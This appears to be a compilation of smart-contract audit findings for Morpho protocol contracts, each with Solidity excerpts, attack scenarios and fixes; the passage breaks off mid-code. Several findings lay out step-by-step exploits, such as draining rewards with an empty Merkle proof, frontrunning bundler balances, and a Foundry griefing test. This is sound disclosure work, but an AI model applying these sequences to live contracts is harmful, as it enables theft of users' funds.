**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_



- Proof of Concept

The issue manifests in the `compoundV2Redeem` function:

```solidity
function compoundV2Redeem(address cToken, uint256 amount) external payable protected {
    amount = Math.min(amount, ERC20(cToken).balanceOf(address(this)));
    require(amount != 0, ErrorsLib.ZERO_AMOUNT);
    ICToken(cToken).redeem(amount);
    // Missing return value check here
}
```

In this function, the `redeem` call to the cToken contract does not include a check for the return value. According to [Compound's documentation](https://docs.compound.finance/v2/ctokens/#redeem), this call should return `0` on success. Without checking this return value, the function may incorrectly assume the operation succeeded even if it fails.

- Impact

The `CompoundV2MigrationBundler` contract lacks essential return value checks for interactions with Compound V2's cToken contracts. This oversight can lead to scenarios where a transaction is assumed successful when, in reality, it has failed, potentially misleading users and leading to discrepancies in accounting and fund management.

> This also seem to have been a honest miss as within the repo for `morpho-blue` these checks were heavily utilized.

- Recommended Mitigation Steps

Implement the return checks, i.e the `compoundV2Redeem` function to check the return value of the `redeem` call. The function should revert if the return value is not `0`, indicating a successful operation.




### `UniversalRewardsDistributor.claim(...)` accepts empty Merkle proof and allows single `Updater` to drain rewards	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** [UniversalRewardsDistributor.sol#L122-L122](universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L122-L122)

- Description

The [MerkleProof.verifyCalldata(bytes32[] calldata proof, bytes32 root, bytes32 leaf)](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/cffb2f1ddcd87efd68effc92cfd336c5145acabd/contracts/utils/cryptography/MerkleProof.sol#L39) method returns `true` in case of an empty Merkle proof, i.e. `proof.length == 0`, and `root == leaf`.

This makes it easy for any malicious `Updater` since they can simply submit a new `root` as `keccak256(bytes.concat(keccak256(abi.encode(account, reward, claimable))`, without any off-chain computations to build a Merkle tree, which allows them drain all rewards via the `UniversalRewardsDistributor.claim(address account, address reward, uint256 claimable, bytes32[] calldata proof)` method with empty `proof`.

Considering the worst-case `timelock == 0`, a malicious `Updater` can even drain all rewards within 1 transaction by calling the following methods of the `UniversalRewardsDistributor` contract:
1. `submitRoot(keccak256(bytes.concat(keccak256(abi.encode(account, reward, claimable)), someIpfsHash);`
2. `acceptRoot();`
3. `claim(account, reward, claimable, new bytes32[](0));`


- Recommendation

* Enforce a minimum Merkle tree depth in `UniversalRewardsDistributor.claim(...)`:
```diff
diff --git a/src/UniversalRewardsDistributor.sol b/src/UniversalRewardsDistributor.sol
index f29c2ae..c12d663 100644
--- a/src/UniversalRewardsDistributor.sol
+++ b/src/UniversalRewardsDistributor.sol
@@ -117,6 +117,7 @@ contract UniversalRewardsDistributor is IUniversalRewardsDistributorStaticTyping
         returns (uint256 amount)
     {
         require(root != bytes32(0), ErrorsLib.ROOT_NOT_SET);
+        require(proof.length >= MIN_TREE_DEPTH, ErrorsLib.INVALID_PROOF_OR_EXPIRED):
         require(
             MerkleProof.verifyCalldata(
                 proof, root, keccak256(bytes.concat(keccak256(abi.encode(account, reward, claimable))))

```
* Implement a mechanism that requires at least 2 `Updaters` to submit the same Merkle root before it can be accepted.




### Denial of Service attacks can stop MorphoBundler repayments.	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Description
The [MorphoBundler](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol) provides functions that allow users to interact with Morpho Blue. One such function is the [morphoRepay](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L174) function. This function allows users to repay a loan they have taken from Morpho Blue. 

```
    function morphoRepay(
        MarketParams calldata marketParams,
        uint256 assets,
        uint256 shares,
        uint256 slippageAmount,
        address onBehalf,
        bytes calldata data
    ) external payable protected {
        // Do not check `onBehalf` against the zero address as it's done at Morpho's level.
        require(onBehalf != address(this), ErrorsLib.BUNDLER_ADDRESS);

        // Don't always cap the assets to the bundler's balance because the liquidity can be transferred later
        // (via the `onMorphoRepay` callback).
        // duplicates e.g morpho repay
        if (assets == type(uint256).max) assets = ERC20(marketParams.loanToken).balanceOf(address(this));

        _approveMaxTo(marketParams.loanToken, address(MORPHO));

        (uint256 repaidAssets, uint256 repaidShares) = MORPHO.repay(marketParams, assets, shares, onBehalf, data);
        if (assets > 0) require(repaidShares >= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);
        else require(repaidAssets <= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);
    }
```

To repay a loan the user has to send the amount of tokens he wants to repay to the Bundler. This amount is specified using the `assets` argument. This argument can be the specific amount the user wants to repay or `type(uint256).max`. When it's `type(uint256).max` the full balance of the Bundler contract is used. 

The [repay](https://github.com/morpho-org/morpho-blue/blob/414b67a523dbc72144a5dfed62ac60771f15d98e/src/Morpho.sol#L266) function on Morpho Blue is called to allow users make the loan repayment. 

```
    function repay(
        MarketParams memory marketParams,
        uint256 assets,
        uint256 shares,
        address onBehalf,
        bytes calldata data
    ) external returns (uint256, uint256) {
        Id id = marketParams.id();
        require(market[id].lastUpdate != 0, ErrorsLib.MARKET_NOT_CREATED);
        require(UtilsLib.exactlyOneZero(assets, shares), ErrorsLib.INCONSISTENT_INPUT);
        require(onBehalf != address(0), ErrorsLib.ZERO_ADDRESS);

        _accrueInterest(marketParams, id);

        if (assets > 0) shares = assets.toSharesDown(market[id].totalBorrowAssets, market[id].totalBorrowShares);
        else assets = shares.toAssetsUp(market[id].totalBorrowAssets, market[id].totalBorrowShares);

        position[id][onBehalf].borrowShares -= shares.toUint128();
        market[id].totalBorrowShares -= shares.toUint128();
        market[id].totalBorrowAssets = UtilsLib.zeroFloorSub(market[id].totalBorrowAssets, assets).toUint128();
        ...
```

As shown by the snippet above the repay function subtracts the equivalent amount of shares the user is paying from the user `borrowShares`. But if the amount of shares the user pays is greater than his borrowShares it'll lead to an Arithmetic underflow. This shouldn't occur when the user calls `repay` directly from his EOA (Externally Owned Account). But it can occur when the user uses Morpho Bundler.

If a user calls `morphoRepay` on the MorphoBundler with `assets = type(uint256).max`, an attacker can front run the transaction with a transaction that sends enough amount of loan tokens that will cause the user to repay more than he owes on MorphoBlue. This will cause an Arithmetic overflow/underflow error. 

This is possible because when the user passes `type(uint256).max`, MorphoBundler uses its full balance to repay.

```
        if (assets == type(uint256).max) assets = ERC20(marketParams.loanToken).balanceOf(address(this));

        _approveMaxTo(marketParams.loanToken, address(MORPHO));

        (uint256 repaidAssets, uint256 repaidShares) = MORPHO.repay(marketParams, assets, shares, onBehalf, data);
```

The attacker can grief the transaction and lose some funds or sandwich the transaction with a frontrun transaction that first donates to the Bundler and a backrun transaction that takes back the donation when the repayment fails.

- Impact
The `assets` parameter is set to `type(uint256).max` when the user doesn't know the exact amount of loan tokens he'll have in the contract when `morphoRepay` is called in the bundle. This may be because a previous transaction will supply this amount. 

This issue will prevent the user from using this feature and force him to approximate the amount he'll have when `morphoRepay` is called. Approximating would mean he may leave some tokens in the Bundler when he completes his transaction. With the present MEV environment, the remaining tokens will most likely be stolen.

- Proof Of Concept
    function testRepayMaxAndWithdrawCollateral(uint256 privateKey, uint256 amount) public {
        address user;
        (privateKey, user) = _boundPrivateKey(privateKey);
        address attacker;
        (, attacker) = _boundPrivateKey(privateKey + 1);
        approveERC20ToMorphoAndBundler(user);

        amount = bound(amount, MIN_AMOUNT, MAX_AMOUNT);

        loanToken.setBalance(address(this), amount);
        // set attacke balance
        loanToken.setBalance(attacker, 1);
        morpho.supply(marketParams, amount, 0, SUPPLIER, hex"");

        uint256 collateralAmount = amount.wDivUp(LLTV);

        collateralToken.setBalance(user, collateralAmount);
        vm.startPrank(user);
        morpho.supplyCollateral(marketParams, collateralAmount, user, hex"");
        morpho.borrow(marketParams, amount, 0, user, user);
        vm.stopPrank();

        bundle.push(_erc20TransferFrom(address(loanToken), amount));
        bundle.push(_morphoSetAuthorizationWithSig(privateKey, true, 0, false));
        bundle.push(_morphoRepay(marketParams, type(uint256).max, 0, 0, user));

        // frontrun bundle call
        vm.prank(attacker);
        loanToken.transfer(address(bundler), 1);

        vm.prank(user);
        // Panic(17) - Arithmetic overflow/underflow
        vm.expectRevert(hex"4e487b710000000000000000000000000000000000000000000000000000000000000011");
        bundler.multicall(bundle);
    }


- Recommendation
When the user specifies `assets` as `type(uint256).max`, let the maximum amount of assets sent be the maximum amount he owes.



### Owner can nerf UniversalRewardsDistributor via timelock settings change	_(duplicate of [Add limits `newTimelock` to prevent excessively long timelocks])_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Impact
The owner of the contract can nerf the UniversalRewardsDistributor contract by following two steps:

1. Call `setTimelock()` and set the timelock to uint256 max value
2. Call `setOwner()` and set to a zero address.

This will lead to an updater not be able to submit a new root because `block.timestamp + timelock` will revert in `submitRoot()`.

- Proof of Concept

The following code below shows how this exploit is possible:

```solidity

    function setTimelock(uint256 newTimelock) external onlyOwner {
        require(newTimelock != timelock, ErrorsLib.ALREADY_SET);

        _setTimelock(newTimelock);
    }

    function _setTimelock(uint256 newTimelock) internal {
        timelock = newTimelock;
    }

    function submitRoot(bytes32 newRoot, bytes32 newIpfsHash) external onlyUpdaterRole {
        require(newRoot != pendingRoot.root || newIpfsHash != pendingRoot.ipfsHash, ErrorsLib.ALREADY_PENDING);

        // AUDIT: below you see block.timestamp + timelock. This will revert as timelock is set to an absurdly high value.
        pendingRoot = PendingRoot({root: newRoot, ipfsHash: newIpfsHash, validAt: block.timestamp + timelock});
    }


```
- Tools Used
Eyes

- Recommended Mitigation Steps
Add a require check in `setTimelock()` that checks `block.timestamp + newTimelock` will not revert.



### CompoundV2MigrationBundler may not repay all funds or revert if too much is repaid	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Impact

When a user calls CompoundV2MigrationBundler.compoundV2Repay(), they are repaying a borrowed position on Compound. Unfortunately, Compound V2 will accumulate interest when the CompoundV2.repayBorrowBehalf() is called. This can lead to results where the borrower will be unable to determine how much is owed to Compound. In addition, the amount that is being repaid may exceed the borrowed position as the time of tx execution.

These factors lead to Morpho Bundler not repaying the borrowed position in full when a user attempts to provide a precise repayment value to Compound V2. Or if Bundler overpays, Compound.repayBorrowFresh will revert.

Morpho's problem here is the liberal use of `amount`.`amount` can be set to below the ERC20 balance but still exceed the debt owed which causes a revert. Or the user may set the value to max uint with the expectation of paying back the full loan without realizing that interest needs to accumulate first. 

 
- Proof of Concept

As you can see below, when compoundV2Repay is called Compound will revert if the repayment value exceeds `accountBorrowsPrev`. This code can be found in the Compound.repayBorrowFresh function below.

Morpho code:

```solidity
function compoundV2Repay(address cToken, uint256 amount) external payable protected {
    if (cToken == C_ETH) {
        // AUDIT: protocol does not calculate the amount that the borrower actually owes

        amount = Math.min(amount, address(this).balance);

        require(amount != 0, ErrorsLib.ZERO_AMOUNT);

        ICEth(C_ETH).repayBorrowBehalf{value: amount}(initiator());
    } else {
        address underlying = ICToken(cToken).underlying();

        if (amount != type(uint256).max) {
            amount = Math.min(amount, ERC20(underlying).balanceOf(address(this)));
        }

        require(amount != 0, ErrorsLib.ZERO_AMOUNT);

        _approveMaxTo(underlying, cToken);

        ICToken(cToken).repayBorrowBehalf(initiator(), amount);
    }
}
```

Compound code:

```solidity
function repayBorrowBehalf(address borrower, uint repayAmount) override external returns (uint) {
    repayBorrowBehalfInternal(borrower, repayAmount);
    return NO_ERROR;
}

/**
 * @notice Sender repays a borrow belonging to borrower
 * @param borrower the account with the debt being payed off
 * @param repayAmount The amount to repay, or -1 for the full outstanding amount
 */
function repayBorrowBehalfInternal(address borrower, uint repayAmount) internal nonReentrant {
    // AUDIT: accrue interest occurs here
    accrueInterest();
    // repayBorrowFresh emits repay-borrow-specific logs on errors, so we don't need to
    repayBorrowFresh(msg.sender, borrower, repayAmount);
}


/**
 * @notice Borrows are repaid by another user (possibly the borrower).
 * @param payer the account paying off the borrow
 * @param borrower the account with the debt being payed off
 * @param repayAmount the amount of underlying tokens being returned, or -1 for the full outstanding amount
 * @return (uint) the actual repayment amount.
 */
function repayBorrowFresh(address payer, address borrower, uint repayAmount) internal returns (uint) {
    /* Fail if repayBorrow not allowed */
    uint allowed = comptroller.repayBorrowAllowed(address(this), payer, borrower, repayAmount);
    if (allowed != 0) {
        revert RepayBorrowComptrollerRejection(allowed);
    }

    /* Verify market's block number equals current block number */
    if (accrualBlockNumber != getBlockNumber()) {
        revert RepayBorrowFreshnessCheck();
    }

    /* We fetch the amount the borrower owes, with accumulated interest */
    uint accountBorrowsPrev = borrowBalanceStoredInternal(borrower);

    /* If repayAmount == -1, repayAmount = accountBorrows */
    uint repayAmountFinal = repayAmount == type(uint).max ? accountBorrowsPrev : repayAmount;

    /////////////////////////
    // EFFECTS & INTERACTIONS
    // (No safe failures beyond this point)

    /*
     * We call doTransferIn for the payer and the repayAmount
     *  Note: The cToken must handle variations between ERC-20 and ETH underlying.
     *  On success, the cToken holds an additional repayAmount of cash.
     *  doTransferIn reverts if anything goes wrong, since we can't be sure if side effects occurred.
     *   it returns the amount actually transferred, in case of a fee.
     */
    uint actualRepayAmount = doTransferIn(payer, repayAmountFinal);

    /*
     * We calculate the new borrower and total borrow balances, failing on underflow:
     *  accountBorrowsNew = accountBorrows - actualRepayAmount
     *  totalBorrowsNew = totalBorrows - actualRepayAmount
     */
    // AUDIT: this will revert as repay amount will exceed accountBorrowsPrev
    uint accountBorrowsNew = accountBorrowsPrev - actualRepayAmount;


```
 
- Tools Used

Eyes

- Recommended Mitigation Steps

CompoundV2MigrationBundler should calculate the max borrowed position before a repay occurs. This will ensure that the code does not revert. In addition, it should consider adding extra precautions to the user in understanding that by setting uint to max they may be paying more than they expect due to accumulated interest.



### MorphoBundler.morphoLiquidate() can be DOS'd	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Impact
`MorphoBundler.morphoLiquidate()` allows a user to liquidate any unhealthy borrow position. Inside the morphoLiquidate function, Morpho.liquidate is called. The `Morpho.liquidate()` function assumes that the user is passing the maximum amount of seized assets. If the seized asset amount exceeds what is allowed, the function will revert. See this line below in Morpho.liquidate:

`position[id][borrower].borrowShares -= repaidShares.toUint128();`

This allows a malicious user to frontrun an innocent user's call to `MorphoBundler.morphoLiquidate()`. This frontrun involves paying back a trivial amount of debt to the borrower. By doing this, the max seized amount from the liquidation will decrease, causing the innocent user's tx to revert.

- Proof of Concept

For reference, below is the `MorphoBundler.morphoLiquidate()` function:

```solidity
function morphoLiquidate(
    MarketParams calldata marketParams,
    address borrower,
    uint256 seizedAssets,
    uint256 repaidShares,
    uint256 maxRepaidAssets,
    bytes memory data
) external payable protected {
    _approveMaxTo(marketParams.loanToken, address(MORPHO));

    // CONFIRMED AUDIT: this can be DOS'd if a frontrunner pays a small amount of debt, preventing the liquidation if the victim attempts to pay the full amount for liquidation (which would revert in Morpho.sol when decrementing the borrower's borrowShares)
    (, uint256 repaidAssets) = MORPHO.liquidate(marketParams, borrower, seizedAssets, repaidShares, data);

    require(repaidAssets <= maxRepaidAssets, ErrorsLib.SLIPPAGE_EXCEEDED);
}
```

Below you can see the code referencing the liquidate function:

```
/// @inheritdoc IMorphoBase
function liquidate(
    MarketParams memory marketParams,
    address borrower,
    uint256 seizedAssets,
    uint256 repaidShares,
    bytes calldata data
) external returns (uint256, uint256) {
    Id id = marketParams.id();
    require(market[id].lastUpdate != 0, ErrorsLib.MARKET_NOT_CREATED);
    require(UtilsLib.exactlyOneZero(seizedAssets, repaidShares), ErrorsLib.INCONSISTENT_INPUT);

    _accrueInterest(marketParams, id);

    uint256 collateralPrice = IOracle(marketParams.oracle).price();

    require(!_isHealthy(marketParams, id, borrower, collateralPrice), ErrorsLib.HEALTHY_POSITION);

    uint256 repaidAssets;
    {
        // The liquidation incentive factor is min(maxLiquidationIncentiveFactor, 1/(1 - cursor*(1 - lltv))).
        uint256 liquidationIncentiveFactor = UtilsLib.min(
            MAX_LIQUIDATION_INCENTIVE_FACTOR,
            WAD.wDivDown(WAD - LIQUIDATION_CURSOR.wMulDown(WAD - marketParams.lltv))
        );

        if (seizedAssets > 0) {
            repaidAssets =
                seizedAssets.mulDivUp(collateralPrice, ORACLE_PRICE_SCALE).wDivUp(liquidationIncentiveFactor);
            repaidShares = repaidAssets.toSharesDown(market[id].totalBorrowAssets, market[id].totalBorrowShares);
        } else {
            repaidAssets = repaidShares.toAssetsUp(market[id].totalBorrowAssets, market[id].totalBorrowShares);
            seizedAssets =
                repaidAssets.wMulDown(liquidationIncentiveFactor).mulDivDown(ORACLE_PRICE_SCALE, collateralPrice);
        }
    }

    // AUDIT: this can lead to a revert if repaidShares is higher than the borrower's current borrow shares owed.
    position[id][borrower].borrowShares -= repaidShares.toUint128();
    market[id].totalBorrowShares -= repaidShares.toUint128();

    market[id].totalBorrowAssets = UtilsLib.zeroFloorSub(market[id].totalBorrowAssets, repaidAssets).toUint128();

    position[id][borrower].collateral -= seizedAssets.toUint128();

    uint256 badDebtShares;
    if (position[id][borrower].collateral == 0) {
        badDebtShares = position[id][borrower].borrowShares;
        uint256 badDebt = UtilsLib.min(
            market[id].totalBorrowAssets,
            badDebtShares.toAssetsUp(market[id].totalBorrowAssets, market[id].totalBorrowShares)
        );

        market[id].totalBorrowAssets -= badDebt.toUint128();
        market[id].totalSupplyAssets -= badDebt.toUint128();
        market[id].totalBorrowShares -= badDebtShares.toUint128();
        position[id][borrower].borrowShares = 0;
    }

    IERC20(marketParams.collateralToken).safeTransfer(msg.sender, seizedAssets);

    // `repaidAssets` may be greater than `totalBorrowAssets` by 1.
    emit EventsLib.Liquidate(id, msg.sender, borrower, repaidAssets, repaidShares, seizedAssets, badDebtShares);

    if (data.length > 0) IMorphoLiquidateCallback(msg.sender).onMorphoLiquidate(repaidAssets, data);

    IERC20(marketParams.loanToken).safeTransferFrom(msg.sender, address(this), repaidAssets);

    return (seizedAssets, repaidAssets);
}
```

- Tools Used

Eyes

- Recommended Mitigation Steps

Before liquidation occurs, the MorphoBundler.morphoLiquidate() function should calculate the maximum amount of seized asset/repaid shares and get the min between that calculated value and the user suggested values for seized asset/repaid shares. This will ensure that the function never reverts.



### Predictability of the address of `UniversalRewardsDistributor` can be exploited to steal funds	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Description

This vulnerability affects both `UrdFactory` and `MetaMorphoFactory`, but for clarity, we will focus on `UrdFactory`.

When deploying a new `UniversalRewardsDistributor` contract, its address is determined based on:

* The address of the creating contract, in this case, `UrdFactory`.
* The `salt` value provided by the user.

```solidity
File: UrdFactory

    function createUrd(
        //--- SNIP ---//
@->     bytes32 salt
    ) public returns (UniversalRewardsDistributor urd) {
@->     urd = new UniversalRewardsDistributor{salt: salt}(
            initialOwner,
            initialTimelock,
            initialRoot,
            initialIpfsHash
        );

        isUrd[address(urd)] = true;

        //--- SNIP ---//
    }

```

Once the user’s create transaction is broadcasted, the `salt` parameter can be viewed by anyone watching the public mempool. This public readability creates the following issue which can lead to stealing of funds:

**Proof of Concept:**

Consider the following scenario:

1. Alice initiates two transactions. First, a call to the `createUrd` function to deploy a new `UniversalRewardsDistributor` using `salt`: `X`. Second, a fund transfer to the newly created URD.
2. Bob monitors pending transactions in the mempool.
3. Bob frontruns Alice by calling `createUrd` with same salt: `X` and deploys a new `UniversalRewardsDistributor` with himself as the `owner`.
4. Consequently, as Bob's controlled `UniversalRewardsDistributor` is deployed first, funds will be transferred to his URD.
5. As Alice's transaction will have same `salt`, her transaction will revert as that `salt` is already used to deploy the contract.

Additionally, in the event of a network reorganization (network reorg), the likelihood of this issue becomes even more significant. Here's how it can unfold:

1. Alice initiates a transaction successfully and it gets confirmed on the network.
2. However, a network reorganization occurs, which can potentially reorder and invalidate certain transactions.
3. Bob, taking advantage of the network reorg, swiftly creates a `UniversalRewardsDistributor` with the same address as Alice's intended destination.
4. When Alice attempts to transfer assets, it unintentionally directs the funds to the attacker's address due to the altered transaction sequence caused by the network reorg.

This way, this predictability of the address creates an exploitable scenario. That's why it's important to mitigate this issue as suggested below in Recommendation Section.

I would also recommend going through [this](https://code4rena.com/reports/2023-04-caviar#m-11-factorycreate-predictability-of-pool-address-creates-multiple-issues) finding in Caviar contest on C4 earlier this year where Akshay has clearly Highlighted this issue.

**Impact:**

Funds can be accidently/Fraudly transferred to URD Controlled by another address.

- Recommendation

To mitigate this issue, consider deploying the `UniversalRewardsDistributor` contract using a `salt` that encodes `msg.sender`, ensuring uniqueness for each user.

```diff
File: UrdFactory

    function createUrd(
        //--- SNIP ---//
        bytes32 salt
    ) public returns (UniversalRewardsDistributor urd) {

+       bytes32 salt = keccak256(abi.encode(msg.sender, salt));
        urd = new UniversalRewardsDistributor{salt: salt}(
            initialOwner,
            initialTimelock,
            initialRoot,
            initialIpfsHash
        );

        isUrd[address(urd)] = true;

        //--- SNIP ---//
    }

```



### Extra ETH Would Be Lost When Repaying To Compound	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

Among all bundlers is the CompundV2MigrationBundler , where a user can call compoundV2Repay . 
https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV2MigrationBundler.sol#L41

This function repays cToken's underlying asset (example - ETH is the underlying for cETH) . 

Consider the case where the cToken is cETH means we are repaying ETH.

The function calls the `repayBorrowBehalf` at L47 , which calls Compund's CEther contract 
https://github.com/compound-finance/compound-protocol/blob/master/contracts/CEther.sol#L94

which calls the `repayBorrowBehalfInternal` function here https://github.com/compound-finance/compound-protocol/blob/master/contracts/CToken.sol#L630

which calls `repayBorrowFresh` here https://github.com/compound-finance/compound-protocol/blob/master/contracts/CToken.sol#L643 which calls the internal function `doTransferIn()`

ETH sent (msg.value) through the call flows from the original function in the bundler to  `repayBorrowFresh` 

From the implentation of `repayBorrowFresh` it is clear that , if extra eth is sent in the transaction , only the appropriate amount is repaid via the doTransferIn  https://github.com/compound-finance/compound-protocol/blob/master/contracts/CToken.sol#L1132  , and the states are updated accordingly  here https://github.com/compound-finance/compound-protocol/blob/master/contracts/CToken.sol#L679-L680

Meaning if Alice calls the function compoundV2Repay with 50 as msg.value and compound only uses up 30 of that  for the repayment , then 20 ETH is lost for Alice.


Recommedation:

Consider having a refund system or make it clear in the implementation that there exists a risk of funds lost.





### Oracle prone to overflowing	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** [ChainlinkOracle.sol#L117-L120](morpho-blue-oracles/src/ChainlinkOracle.sol#L117-L120)

**Description**: The chainlink oracle calculates price based on the following expression.

```solidity
return SCALE_FACTOR.mulDiv(
        VAULT.getAssets(VAULT_CONVERSION_SAMPLE) * BASE_FEED_1.getPrice() * BASE_FEED_2.getPrice(),
        QUOTE_FEED_1.getPrice() * QUOTE_FEED_2.getPrice()
    );
```

Lets assume the quote token is ETH (18 decimals) and basetoken is WBTC (8 decimals). Lets assume the base and quote feeds all have 18 decimals like the chainlink eth based oracles.

Then `SCALE_FACTOR` decimals is calculated as = 36 + 18 +18+18-8-18-18 = 46 decimals.

Then the quoted expressions decimals is calculated as: (46 decimals) .mulDiv ( 18decimals _ 18decimals, 18decimals _ 18decimals ) = (46 decimals) . mulDiv(36 decimals, 36 decimals).

The function mulDiv(x,y,z) reverts if x*y is larger than uint256, which has a max value of 1.15E77. In the above expression, x*y is 46+36 = 82 decimals, which is larger than 77 decimals. So for this case, the oracle calculations will revert.

It can be trivially shown that mulDiv reverts when x\*y is larger than uint256 with a simple test shown below.

```solidity
function caller() public pure returns(uint256){
        uint256 x = type(uint128).max+1;
        uint256 y = type(uint128).max+1;
        uint256 z = x;

        uint256 result = mulDiv(x, y, z);
        return result;
    }
```

The above snippet reverts.

**Recommendation**: The oracle calculations should be modified to not exceed the bounds of uint256.



### Assets On The Bundler Can Be Stolen By Bots Via FrontRunning	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

Assets can be stolen by a bot in the following steps ->

a.) Alice transfers her ETH to the bundler (she wants to wrap her ether using the stEthBundler and funds need to be sent prior to calling according to the comment https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/StEthBundler.sol#L58)

b.) Now via a multicall of transactions Alice would be wrapping her ETH (`wrapStEth()`) which would wrap the amont of ETH that is present in the bundler . Consider Alice deposits 10 ETH.

c.) Bob monitoring the mempool frontruns this multicall and calls  `wrapStEth()` (also through the  multicall) before Alice could , this would mean that -> Bob wraps the ETH present in the bundler (i.e. 10 ETH deposited by Alice) and gets the stETH back without depositing anything. 

Alice's tx would now fail due to the condition at L63 since there is no ETH in the bundler now and bob enjoys stEth he got from ETH deposited by Alice.





### An attacker might steal other's rewards while handling removed markets.	_(duplicate of [Suppliers can frontrun forced market removal and losses])_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Summary
If a market doesn't work properly for some reason, it might be removed from `WithdrawQueue` although it has some funds.
When this market starts working again, it would be added to `WithdrawQueue` again or withdrawn funds during reallocation.
During these processes, there exists a front-running opportunity to steal this market's funds.

- Vulnerability Detail
As we can see from this comment, a market could be removed with some funds when it doesn't work (e.g. can't withdraw from the market) and shareholders should bear the loss because `totalAssets()` would be decreased accordingly.

```solidity
    /// @notice Submits a forced market removal from the vault, eventually losing all funds supplied to the market. //@audit
    /// @dev Warning: Submitting a forced removal will overwrite the timestamp at which the market will be removable.
    function submitMarketRemoval(Id id) external onlyCuratorRole {}
```

If the market starts working again, there are 2 approaches to recover funds of this market.
- Add this market to `WithdrawQueue` again by calling `submitCap()/acceptCap()`.
- Call `reallocate()` to withdraw funds from this market and supply another one.

But their approaches might be front ran by an attacker.

1. A market with 100 funds has been removed from `WithdrawQueue` by calling `updateWithdrawQueue()`.
2. After that, the market works again and curators/allocators decide to use this market again.
3. There are 2 approaches to recover funds.
3A. A curator calls `submitCap()` for this market and calls `acceptCap()` after the timelock. If this market is added to `WithdrawQueue`, `totalAssets()` will be increased by 100 and these funds will be distributed to existing shareholders during the next interaction.
3B. An allocator calls `reallocate()` to withdraw 100 funds from the market and supply another market. After this reallocation, `totalAssets()` will be increased by 100 also because `WithdrawQueue` contains every market with a positive supply cap.
4. After noticing that, an attacker could deposit funds as much as possible by front-running `acceptCap()` or `reallocate()`.
e.g. If `totalSupply = 1000, totalAssets = 1000`, he can get 1000 shares by depositing 1000 assets.
5. After that, he can redeem all shares at the next block.
As `totalSupply = 1000 + 1000 = 2000, totalAssets = 1000 + 1000 + 100 = 2100`, he can get 2100 * 50% = 1050 assets by burning 1000 shares.

- Impact
An attacker might steal other's rewards while handling removed markets by front-running.

- Code Snippet
https://github.com/morpho-org/metamorpho/blob/a4a6c3dda06379dc3e02fbb053f6761f1e90ea1c/src/MetaMorpho.sol#L397

https://github.com/morpho-org/metamorpho/blob/a4a6c3dda06379dc3e02fbb053f6761f1e90ea1c/src/MetaMorpho.sol#L507

https://github.com/morpho-org/metamorpho/blob/a4a6c3dda06379dc3e02fbb053f6761f1e90ea1c/src/MetaMorpho.sol#L772

- Tool used
Manual Review

- Recommendation
I think we should add another method like `withdrawFromRemovedMarkets()` to withdraw funds to the vault directly (rather than supplying other markets) from already removed markets.
After that, it could be distributed to users who have lost funds during the market removal before.



### Allocator role can remove markets from supplyQueue	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** [MetaMorpho.sol#L325-L326](metamorpho/src/MetaMorpho.sol#L325-L326)

**Description**: The `curator` role is supposed to have the powers necessary to remove markets if needed. This is reflected in the function `submitMarketRemoval` as shown below.

```solidity
function submitMarketRemoval(Id id) external onlyCuratorRole {
        if (config[id].removableAt != 0) revert ErrorsLib.AlreadySet();
        if (!config[id].enabled) revert ErrorsLib.MarketNotEnabled();

        _setCap(id, 0);

        // Safe "unchecked" cast because timelock <= MAX_TIMELOCK.
        config[id].removableAt = uint64(block.timestamp + timelock);

        emit EventsLib.SubmitMarketRemoval(_msgSender(), id);
    }
```

The issue is that the person with the `allocator` role can also block deposits into a market via the `setSupplyQueue` function. In this function, the `allocator` can decide to remove a market from the supply queue. This will ensure future deposits don't go into that specific market.

This action conflicts against the roles given to the curator.

**Recommendation**: Similar to `updateWithdrawQueue`, ensure every market gets added in the `setSupplyQueue` function



### Complete withdrawal can be DoSed in `reallocate` Function due to Precision-Related Revert	_(duplicate of [Reallocation of funds can revert because of rounding ])_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Description

The `reallocate` function in `MetaMorpho` has an issue leading to frequent reverts due to a strict condition check. Specifically, the function concludes with a requirement that `totalWithdrawn` must be exactly equal to `totalSupplied`.

```solidity

    function reallocate(MarketAllocation[] calldata allocations) external onlyAllocatorRole {
        uint256 totalSupplied;
        uint256 totalWithdrawn;
        for (uint256 i; i < allocations.length; ++i) {
            MarketAllocation memory allocation = allocations[i];
            Id id = allocation.marketParams.id();

            (uint256 supplyAssets, uint256 supplyShares,) = _accruedSupplyBalance(allocation.marketParams, id);
            uint256 withdrawn = supplyAssets.zeroFloorSub(allocation.assets);

            if (withdrawn > 0) {
                if (allocation.marketParams.loanToken != asset()) revert ErrorsLib.InconsistentAsset(id);

                // Guarantees that unknown frontrunning donations can be withdrawn, in order to disable a market.
                uint256 shares;
412:            if (allocation.assets == 0) {
                    shares = supplyShares;
                    withdrawn = 0;
                }

417:            (uint256 withdrawnAssets, uint256 withdrawnShares) =
                    MORPHO.withdraw(allocation.marketParams, withdrawn, shares, address(this), address(this));

                emit EventsLib.ReallocateWithdraw(_msgSender(), id, withdrawnAssets, withdrawnShares);

422:            totalWithdrawn += withdrawnAssets;
            } else {
